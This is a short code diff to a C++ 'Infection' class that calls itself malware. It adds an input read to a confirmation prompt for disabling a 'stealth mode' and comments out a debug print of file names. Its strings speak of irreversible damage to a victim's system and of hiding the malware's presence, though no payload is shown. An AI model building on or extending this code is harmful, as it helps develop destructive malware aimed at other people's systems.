@@ -9,7 +9,7 @@ FileInformations Infection::GetFileInformations(const char* fileName){
 	}
 	//File Name
 	infos.fileName = fileName;
-	printf("FileName = %s\n", fileName);
+	//printf("FileName = %s\n", fileName);
 	//File Permissions
 	infos.filePermissions[0] = ((S_ISDIR(fileMetaInformations.st_mode) ? 'd' : '-'));
 	infos.filePermissions[1] = ((fileMetaInformations.st_mode & S_IRUSR) ? 'r' : '-');
@@ -64,7 +64,9 @@ bool Infection::askForNoStealthMode(){
 		if(answer2StealthMode == "YES" || answer2StealthMode == "NO" || answer2StealthMode == "Y" || answer2StealthMode == "N" || answer2StealthMode == "yes" || answer2StealthMode == "no" || answer2StealthMode == "y" || answer2StealthMode == "n"){
 			if(answer2StealthMode == "YES" || answer2StealthMode == "yes" || answer2StealthMode == "y" || answer2StealthMode == "Y"){
 				std::string confirm{""};
-				printf("Are you sure you want to continue ? (The damage caused by the malware are not reversable) : ");
+				printf("Are you sure you want to continue ? (The damage caused by the malware are not reversable) : \n");
+				printf("Please use the following format for your answer (y/Y/yes/YES | n/N/no/NO) : ");
+				std::cin >> confirm;
 				if(confirm == "YES" || confirm == "yes" || confirm == "y" || confirm == "Y"){
 					printf("[+] Stealth Mode Disabled, the user will clearly notice that something happens to his system but i will try to obfuscate our presence the most as possible !\n");
 					return stealthEnabled = false;
